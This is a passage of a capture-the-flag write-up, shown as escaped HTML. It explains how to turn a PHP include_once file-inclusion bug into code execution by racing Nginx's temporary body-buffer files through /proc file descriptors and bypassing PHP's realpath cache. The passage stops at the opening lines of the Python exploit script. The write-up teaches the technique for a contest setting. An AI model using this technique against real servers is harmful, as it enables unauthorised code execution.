&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;RUN chown -R root:root &amp;#x2F;var&amp;#x2F;www &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;\
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;find &amp;#x2F;var&amp;#x2F;www -type d -exec chmod 555 {} &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;\; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;\
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;find &amp;#x2F;var&amp;#x2F;www -type f -exec chmod 444 {} &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;\; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;\
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;chown -R root:root &amp;#x2F;tmp &amp;#x2F;var&amp;#x2F;tmp &amp;#x2F;var&amp;#x2F;lib&amp;#x2F;php&amp;#x2F;sessions &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;\
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;chmod -R 000 &amp;#x2F;tmp &amp;#x2F;var&amp;#x2F;tmp &amp;#x2F;var&amp;#x2F;lib&amp;#x2F;php&amp;#x2F;sessions
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;RUN ln -sf &amp;#x2F;dev&amp;#x2F;stdout &amp;#x2F;var&amp;#x2F;log&amp;#x2F;nginx&amp;#x2F;access.log &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;\
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;ln -sf &amp;#x2F;dev&amp;#x2F;stderr &amp;#x2F;var&amp;#x2F;log&amp;#x2F;nginx&amp;#x2F;error.log
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;RUN find &amp;#x2F; -ignore_readdir_race -type f &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;\(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; -perm -4000 -o -perm -2000 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;\)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; -not -wholename &amp;#x2F;readflag -delete
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;We notice several things when looking at the file. PHP doesn’t have permissions to write into its sessions directory, which prevents us from setting a PHP session with malicious code into a session file. In addition, when PHP creates temporary files (for buffering, or &amp;lt;code&amp;gt;php:&amp;#x2F;&amp;#x2F;temp&amp;lt;&amp;#x2F;code&amp;gt; for example) it runs the &amp;lt;code&amp;gt;php_get_temporary_directory()&amp;lt;&amp;#x2F;code&amp;gt; function to resolve the temp directory. Sadly, in this setup the result is always &amp;lt;code&amp;gt;&amp;#x2F;tmp&amp;lt;&amp;#x2F;code&amp;gt;. Since PHP can’t write into it (see &amp;lt;code&amp;gt;Dockerfile&amp;lt;&amp;#x2F;code&amp;gt; above) - we didn’t go in this direction.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;On top of that - Nginx’s log files are redirected to &amp;lt;code&amp;gt;stdout&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;stderr&amp;lt;&amp;#x2F;code&amp;gt; which means that there are no logs on the filesystem (i.e. we can’t use Nginx access &amp;#x2F; errors to write malicious code into a file).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;ignoring-the-obvious&amp;quot;&amp;gt;Ignoring the Obvious&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;When you’re doing enough challenges, you learn to spot the important parts of the challenge - the little clues that are right in front of you, the configuration that should not be there, the misplaced &amp;lt;code&amp;gt;&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt;, the unusual choice of words in the description.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;php&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-php &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-php&amp;quot; data-lang=&amp;quot;php&amp;quot;&amp;gt;&amp;lt;span&amp;gt;... readfile($_GET[&amp;amp;#39;file&amp;amp;#39;] ?? &amp;amp;#39;index.php&amp;amp;#39;) : include_once($_GET[&amp;amp;#39;file&amp;amp;#39;] ...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;The challenge consists of two major parts - &amp;lt;code&amp;gt;readfile()&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt;. At first sight, it seems like we were meant to leverage &amp;lt;code&amp;gt;readfile()&amp;lt;&amp;#x2F;code&amp;gt; for somehow placing a file and &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt; to execute it. Having said that, completely aware of the path we’re supposed to walk in, we chose to go in a completely different way.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;the-pasten-way&amp;quot;&amp;gt;The Pasten Way&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;There is nothing like solving a challenge in an unintended way! Trying to find different types of dynamic files, we decided to look into Nginx as a target. The first Google result for &amp;lt;code&amp;gt;&amp;quot;nginx tempfile&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt; was actually a breakthrough, revealing Nginx &amp;lt;strong&amp;gt;does&amp;lt;&amp;#x2F;strong&amp;gt; create temporary files (mainly because people were complaining about permission errors).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;When we read more about it, we found the following documentation:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;client_body_buffer_size:
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;Sets buffer size for reading client request body. In case the request body is larger than the buffer, the whole body or only its part is written to a temporary file. By default, buffer size is equal to two memory pages. This is 8K on x86, other 32-bit platforms, and x86-64. It is usually 16K on other 64-bit platforms.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Sound good doesn’t it? Testing this behavior was a little tricky since we never actually saw these files on the filesystem. This behavior can be easily explained when looking at the relevant source code in Nginx:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;c&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-c &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-c&amp;quot; data-lang=&amp;quot;c&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;ngx_open_tempfile(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;u_char &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;name, ngx_uint_t persistent, ngx_uint_t access)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;{
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    ngx_fd_t  fd;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    fd &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;open((&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;const char &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) name, O_CREAT&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;|&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;O_EXCL&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;|&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;O_RDWR,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;              access &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;?&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; access &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;: &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;0600&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(fd &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;!= -&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1 &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;amp;&amp;amp;amp; !&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;persistent) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;        (&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;void&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;unlink((&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;const char &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;) name)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    }
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;return&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; fd;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;As you can see, the temporary file is created, then &amp;lt;strong&amp;gt;immediately&amp;lt;&amp;#x2F;strong&amp;gt; deleted! This is a hell of a race to win. Nevertheless we decided to go for it.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The temporary file name will be a (10 digit 0-padded) sequential number that isn’t really predictable (it’s directly based on the number of previously handled buffered bodies at the time the request is processed).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Luckily - we can use &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx worker pid&amp;amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;amp;lt;fd&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; to access these files through the open file descriptors of the Nginx worker processes! In order to easily test this behavior we simply generated a request that is larger than &amp;lt;code&amp;gt;16K&amp;lt;&amp;#x2F;code&amp;gt; and made sure to keep the request going - sending the data byte by byte to leave the &amp;lt;code&amp;gt;fd&amp;lt;&amp;#x2F;code&amp;gt; open.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;The weird thing about file descriptors in procfs is that they (in a way) behave both as symlinks and hardlinks. If a file was deleted while a process holds an open file descriptor:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;code&amp;gt;realpath()&amp;lt;&amp;#x2F;code&amp;gt; will return the last path of the file with &amp;lt;code&amp;gt;&amp;quot; (deleted)&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt; appended to it.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;code&amp;gt;open()&amp;lt;&amp;#x2F;code&amp;gt; will return an &amp;lt;code&amp;gt;fd&amp;lt;&amp;#x2F;code&amp;gt; that can be used to read the original file content.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;Using this method we could potentially use the Nginx file descriptor to access the temporary file and include its content (which is completely controlled by us).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Unfortunately, PHP identifies the file descriptor as a symlink and thus attempts to resolve it’s link, as shown in the &amp;lt;code&amp;gt;php-core&amp;lt;&amp;#x2F;code&amp;gt; snippet below:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;c&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-c &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-c&amp;quot; data-lang=&amp;quot;c&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;...
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;if &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;++&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;ll) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;gt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; LINK_MAX &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;|| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(j &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;size_t&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;php_sys_readlink(tmp, path, MAXPATHLEN)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;== &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;(&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;size_t&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;)&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;1&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;) {
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;	&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;...    
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;}
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;This means that PHP has to resolve the link and open the file between the creation and deletion of the temporary file by Nginx (which, as shown above, is literally 2 lines of code apart).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;So, the optimists will claim that a race is a race and it’s always exploitable (and they will be right!). Sadly, it’s not that easy.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;While attempting to exploit, we noticed that after resolving a link - PHP caches the resolution by default.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;&amp;lt;img src=&amp;quot;&amp;#x2F;images&amp;#x2F;posts&amp;#x2F;winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021&amp;#x2F;1.png&amp;quot; alt=&amp;quot;&amp;quot; &amp;#x2F;&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;This is important because realistically, we will fail &amp;lt;em&amp;gt;many&amp;lt;&amp;#x2F;em&amp;gt; times before winning the Nginx open + delete race. If we loop through every file descriptor number before succeeding, we are inserting the broken links to the cache and thus preventing us from accessing this file descriptor number again. When PHP resolves a link to a deleted file, it puts its path + &amp;lt;code&amp;gt;&amp;quot; (deleted)&amp;quot;&amp;lt;&amp;#x2F;code&amp;gt; in the cache, and will not try to resolve it again until the TTL or the cache size has been exceeded.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;To overcome this &amp;quot;feature&amp;quot; we decided to implement a straightforward bypass. Instead of attempting to access the same path over and over (through &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx worker pid&amp;amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;amp;lt;fd&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;) we thought about using a simple trick to access it in countless different ways:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If we could find multiple different paths that link to the root directory, we can use them to build unique paths to our file descriptors.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Even though &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;some nginx worker pid&amp;amp;gt;&amp;#x2F;root&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx worker pid&amp;amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;amp;lt;fd&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;nginx worker pid&amp;amp;gt;&amp;#x2F;fd&amp;#x2F;&amp;amp;lt;fd&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; resolve to the same path - adding the randomly generated prefixes makes the PHP realpath cache irrelevant. We use a random amount of &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;some nginx pid&amp;amp;gt;&amp;#x2F;root&amp;lt;&amp;#x2F;code&amp;gt; and &amp;lt;code&amp;gt;&amp;#x2F;proc&amp;#x2F;&amp;amp;lt;some nginx pid&amp;amp;gt;&amp;#x2F;cwd&amp;lt;&amp;#x2F;code&amp;gt; as components to build the path prefix since they all lead to &amp;lt;code&amp;gt;&amp;#x2F;&amp;lt;&amp;#x2F;code&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;This method is unique and is based on the underlying filesystem and operating system - making it harder to mitigate and patch.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Equipped with these strategies we tried to retrieve the flag and after about 3~ minutes we consistently managed to &amp;lt;code&amp;gt;include_once()&amp;lt;&amp;#x2F;code&amp;gt; the temporary file that contains our malicious payload in &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt;!&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;exploit-implementation&amp;quot;&amp;gt;Exploit Implementation&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;We’ve used the following Python script to solve &amp;lt;code&amp;gt;includer&amp;#x27;s revenge&amp;lt;&amp;#x2F;code&amp;gt; (and a slightly modified version for &amp;lt;code&amp;gt;counter&amp;lt;&amp;#x2F;code&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;python&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-python &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-python&amp;quot; data-lang=&amp;quot;python&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;requests
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;threading
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;multiprocessing
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;threading
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;import &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;random
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;SERVER &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;http:&amp;#x2F;&amp;#x2F;localhost:8088&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;NGINX_PIDS_CACHE &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;= &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;set&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;([&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;34&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;35&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;36&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;37&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;38&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;39&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;40&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;, &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#d3869b;&amp;quot;&amp;gt;41&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;])
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Set the following to True to use the above set of PIDs instead of scanning:
